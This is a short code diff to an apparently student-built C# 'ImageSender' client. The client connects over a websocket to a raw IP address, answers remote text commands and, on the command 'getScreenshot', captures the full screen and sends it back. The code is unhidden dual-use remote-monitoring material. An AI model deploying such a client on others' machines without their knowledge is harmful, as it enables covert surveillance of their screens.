@@ -21,6 +21,7 @@ namespace ImageSender
              // ws = new WebSocket(url: "ws://si-grupa5.herokuapp.com", onMessage: OnMessage, onError: OnError);
             ws = new WebSocket(url: "ws://109.237.36.76:25565", onMessage: OnMessage, onError: OnError);
             ws.Connect().Wait();
+
             sendMessage("sendCredentials", "" );
         }
 
@@ -32,19 +33,22 @@ namespace ImageSender
         private static Task OnMessage(MessageEventArgs messageEventArgs)
         {
             string text = messageEventArgs.Text.ReadToEnd();
-            if (text.Contains("mkdir"))
+            if (text.Contains("cd"))
             {
-                sendMessage("Evo radi", "command_result");
+                sendMessage("command_result", "radi");
             }
             else if (text == "getScreenshot") sendScreenshot();
-
+           else if (text != "Connected")
+            {
+                sendMessage("command_result", "Komanda ne postoji");
+            }
             return Task.FromResult(0);
         }
 
         private static void sendScreenshot()
         {
 
-            var captureBmp = new Bitmap(1024, 1024, PixelFormat.Format32bppArgb);
+            var captureBmp = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb);
             using (var captureGraphic = Graphics.FromImage(captureBmp))
             {
                 captureGraphic.CopyFromScreen(0, 0, 0, 0, captureBmp.Size);
